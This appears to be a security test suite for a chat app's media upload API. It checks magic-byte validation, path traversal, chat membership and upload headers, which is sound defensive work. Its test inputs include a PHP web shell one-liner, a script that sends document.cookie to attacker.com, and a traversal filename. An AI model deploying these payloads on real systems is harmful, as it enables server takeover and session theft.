import { describe, it, expect, beforeAll } from 'vitest';
import request from 'supertest';
import fs from 'fs';
import path from 'path';
import { createApp } from '../app.js';
import { signAccessToken } from '../utils/jwt.js';
import { addOrUpdateConversation, StoredConversation } from '../utils/dataStore.js';

describe('BecuGram Phase 4.5: Independent Security & Access Control Audit Tests', () => {
  const app = createApp();

  const userAlice = { userId: 'sec_alice_101', username: 'alice_sec', displayName: 'Alice Sec' };
  const userBob = { userId: 'sec_bob_102', username: 'bob_sec', displayName: 'Bob Sec' };
  const userAttacker = { userId: 'sec_attacker_666', username: 'attacker_x', displayName: 'Attacker' };

  const tokenAlice = signAccessToken(userAlice);
  const tokenBob = signAccessToken(userBob);
  const tokenAttacker = signAccessToken(userAttacker);

  const privateChatId = `chat_sec_private_${Date.now()}`;

  beforeAll(() => {
    const conv: StoredConversation = {
      _id: privateChatId,
      type: 'direct',
      participants: [userAlice.userId, userBob.userId],
      partner: {
        _id: userBob.userId,
        displayName: userBob.displayName,
        username: userBob.username,
        isOnline: true,
        isVerified: false,
      },
      unreadCount: 0,
      createdAt: new Date().toISOString(),
    };
    addOrUpdateConversation(conv);
  });

  describe('1. MIME & Magic Bytes Content Validation (Sniffing)', () => {
    it('REJECTS Windows PE executable disguised as PNG (MZ header in .png file)', async () => {
      // Buffer starting with MZ (0x4D, 0x5A) - typical Windows PE executable
      const fakePngBuffer = Buffer.from('4d5a90000300000004000000ffff0000', 'hex');

      const res = await request(app)
        .post('/api/media/upload')
        .set('Authorization', `Bearer ${tokenAlice}`)
        .attach('file', fakePngBuffer, 'innocent_photo.png');

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('DANGEROUS_FILE_CONTENT');
      expect(res.body.error.message).toContain('Dangerous binary detected');
    });

    it('REJECTS Linux ELF binary disguised as JPEG (ELF header in .jpg file)', async () => {
      // Buffer starting with \x7fELF (0x7F, 0x45, 0x4C, 0x46)
      const fakeJpgBuffer = Buffer.from('7f454c46020101000000000000000000', 'hex');

      const res = await request(app)
        .post('/api/media/upload')
        .set('Authorization', `Bearer ${tokenAlice}`)
        .attach('file', fakeJpgBuffer, 'profile.jpg');

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('DANGEROUS_FILE_CONTENT');
    });

    it('REJECTS Web shell script disguised as text or image (<?php header)', async () => {
      const phpShellBuffer = Buffer.from('<?php system($_GET["cmd"]); ?>');

      const res = await request(app)
        .post('/api/media/upload')
        .set('Authorization', `Bearer ${tokenAlice}`)
        .attach('file', phpShellBuffer, 'notes.txt');

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('DANGEROUS_FILE_CONTENT');
    });

    it('REJECTS HTML with script tags disguised as document (<script> tag)', async () => {
      const xssBuffer = Buffer.from('<script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>');

      const res = await request(app)
        .post('/api/media/upload')
        .set('Authorization', `Bearer ${tokenAlice}`)
        .attach('file', xssBuffer, 'readme.txt');

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('DANGEROUS_FILE_CONTENT');
    });

    it('REJECTS claimed image without valid image magic bytes', async () => {
      const corruptData = Buffer.from('This is not a real image at all, just plain text characters.');

      const res = await request(app)
        .post('/api/media/upload')
        .set('Authorization', `Bearer ${tokenAlice}`)
        .attach('file', corruptData, 'fake_avatar.png');

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('DANGEROUS_FILE_CONTENT');
      expect(res.body.error.message).toContain('Claimed image file does not contain valid image header');
    });

    it('ACCEPTS authentic PNG image with standard 8-byte PNG signature', async () => {
      const validPng = Buffer.from('89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000a49444154789c63000100000500010d0a2db40000000049454e44ae426082', 'hex');

      const res = await request(app)
        .post('/api/media/upload')
        .set('Authorization', `Bearer ${tokenAlice}`)
        .attach('file', validPng, 'real_image.png');

      expect(res.status).toBe(201);
      expect(res.body.success).toBe(true);
      expect(res.body.data.mimeType).toBe('image/png');
      expect(res.body.data.url).toContain('/uploads/images/');
    });

    it('ACCEPTS authentic PDF document with %PDF magic bytes', async () => {
      const validPdf = Buffer.from('%PDF-1.4\n%âãÏÓ\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n%%EOF');

      const res = await request(app)
        .post('/api/media/upload')
        .set('Authorization', `Bearer ${tokenAlice}`)
        .attach('file', validPdf, 'financial_report.pdf');

      expect(res.status).toBe(201);
      expect(res.body.success).toBe(true);
      expect(res.body.data.mimeType).toBe('application/pdf');
      expect(res.body.data.url).toContain('/uploads/documents/');
    });
  });

  describe('2. Path Traversal & Filename Sanitization', () => {
    it('sanitizes path traversal payloads in filename (../../etc/passwd)', async () => {
      const validPng = Buffer.from('89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000a49444154789c63000100000500010d0a2db40000000049454e44ae426082', 'hex');

      const res = await request(app)
        .post('/api/media/upload')
        .set('Authorization', `Bearer ${tokenAlice}`)
        .attach('file', validPng, '../../../../var/log/secret.png');

      expect(res.status).toBe(201);
      expect(res.body.success).toBe(true);
      // Ensure the generated url does NOT contain ../ and is strictly inside /uploads/images/
      expect(res.body.data.url).not.toContain('..');
      expect(res.body.data.url).toMatch(/^\/uploads\/images\/\d+_[a-f0-9]+\.png$/);
    });
  });

  describe('3. Conversation Membership Access Control', () => {
    const validPng = Buffer.from('89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000a49444154789c63000100000500010d0a2db40000000049454e44ae426082', 'hex');

    it('BLOCKS unauthorized user from uploading with conversationId', async () => {
      const res = await request(app)
        .post('/api/media/upload')
        .set('Authorization', `Bearer ${tokenAttacker}`)
        .field('conversationId', privateChatId)
        .attach('file', validPng, 'exploit.png');

      expect(res.status).toBe(403);
      expect(res.body.error.code).toBe('FORBIDDEN');
    });

    it('REJECTS upload associated with non-existent conversationId', async () => {
      const res = await request(app)
        .post('/api/media/upload')
        .set('Authorization', `Bearer ${tokenAlice}`)
        .field('conversationId', 'conv_fake_nonexistent_99999')
        .attach('file', validPng, 'test.png');

      expect(res.status).toBe(404);
      expect(res.body.error.code).toBe('CONVERSATION_NOT_FOUND');
    });

    it('ALLOWS legitimate chat participant to upload with conversationId', async () => {
      const res = await request(app)
        .post('/api/media/upload')
        .set('Authorization', `Bearer ${tokenAlice}`)
        .field('conversationId', privateChatId)
        .attach('file', validPng, 'legit.png');

      expect(res.status).toBe(201);
      expect(res.body.success).toBe(true);
    });
  });

  describe('4. Deleted Messages & Physical Storage File Purge', () => {
    it('deleting a message for everyone purges media from database and removes disk file', async () => {
      // 1. Upload valid image
      const validPng = Buffer.from('89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000a49444154789c63000100000500010d0a2db40000000049454e44ae426082', 'hex');
      const uploadRes = await request(app)
        .post('/api/media/upload')
        .set('Authorization', `Bearer ${tokenAlice}`)
        .attach('file', validPng, 'to_be_deleted.png');

      expect(uploadRes.status).toBe(201);
      const mediaUrl = uploadRes.body.data.url;

      // Verify file exists on disk
      const filePath = path.resolve(process.cwd(), './uploads', mediaUrl.replace('/uploads/', ''));
      expect(fs.existsSync(filePath)).toBe(true);

      // 2. Send message with this media
      const msgRes = await request(app)
        .post(`/api/chats/${privateChatId}/messages`)
        .set('Authorization', `Bearer ${tokenAlice}`)
        .send({
          type: 'image',
          content: 'Secret image to be deleted',
          media: {
            url: mediaUrl,
            name: 'to_be_deleted.png',
            size: validPng.length,
            mimeType: 'image/png',
          },
        });

      expect(msgRes.status).toBe(201);
      const msgId = msgRes.body.data._id;

      // 3. Delete message for everyone
      const deleteRes = await request(app)
        .delete(`/api/messages/${msgId}?forEveryone=true`)
        .set('Authorization', `Bearer ${tokenAlice}`);

      expect(deleteRes.status).toBe(200);

      // 4. Verify physical file is purged from disk!
      expect(fs.existsSync(filePath)).toBe(false);

      // 5. Query messages: deleted message is excluded from conversation messages list
      const chatRes = await request(app)
        .get(`/api/chats/${privateChatId}/messages`)
        .set('Authorization', `Bearer ${tokenBob}`);

      const foundMsg = chatRes.body.data.messages.find((m: any) => m._id === msgId);
      expect(foundMsg).toBeUndefined();
    });
  });

  describe('5. Uploads Security Headers (Execution Prevention)', () => {
    it('sets nosniff, CSP, and forces attachment for documents', async () => {
      // Upload a valid PDF document
      const validPdf = Buffer.from('%PDF-1.4\n%âãÏÓ\n1 0 obj<</Type/Catalog>>endobj\n%%EOF');
      const uploadRes = await request(app)
        .post('/api/media/upload')
        .set('Authorization', `Bearer ${tokenAlice}`)
        .attach('file', validPdf, 'contract.pdf');

      const url = uploadRes.body.data.url;
      const res = await request(app).get(url);

      expect(res.status).toBe(200);
      expect(res.headers['x-content-type-options']).toBe('nosniff');
      expect(res.headers['content-security-policy']).toContain("default-src 'none'");
      expect(res.headers['content-disposition']).toBe('attachment');
    });
  });
});
